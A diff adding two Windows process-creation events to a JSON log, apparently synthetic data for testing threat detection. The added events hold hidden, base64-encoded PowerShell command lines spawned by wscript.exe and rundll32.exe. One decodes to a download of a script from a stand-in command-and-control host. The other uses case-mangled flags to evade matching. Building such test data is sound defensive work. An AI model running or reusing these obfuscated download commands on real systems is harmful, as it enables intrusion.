@@ -20,5 +20,27 @@
       "TargetUserName": "jdoe",
       "NewProcessId": "5120"
     }
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-11-13T10:18:19.000Z",
+    "EventData": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe /W Hidden /NoP /e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AYwAyAC4AbABvAGMAYQBsAC8AcwAuAHAAcwAxAA==",
+      "ParentProcessName": "C:\\Windows\\System32\\wscript.exe",
+      "TargetUserName": "finance_admin",
+      "NewProcessId": "6104"
+    }
+  },
+  {
+    "EventID": 4688,
+    "TimeCreated": "2026-11-13T10:20:45.000Z",
+    "EventData": {
+      "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -NoProfile -WindoWStyle hIdDeN -EnCoDeDcOmMaNd JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQA=",
+      "ParentProcessName": "C:\\Windows\\System32\\rundll32.exe",
+      "TargetUserName": "SYSTEM",
+      "NewProcessId": "7248"
+    }
   }
 ]
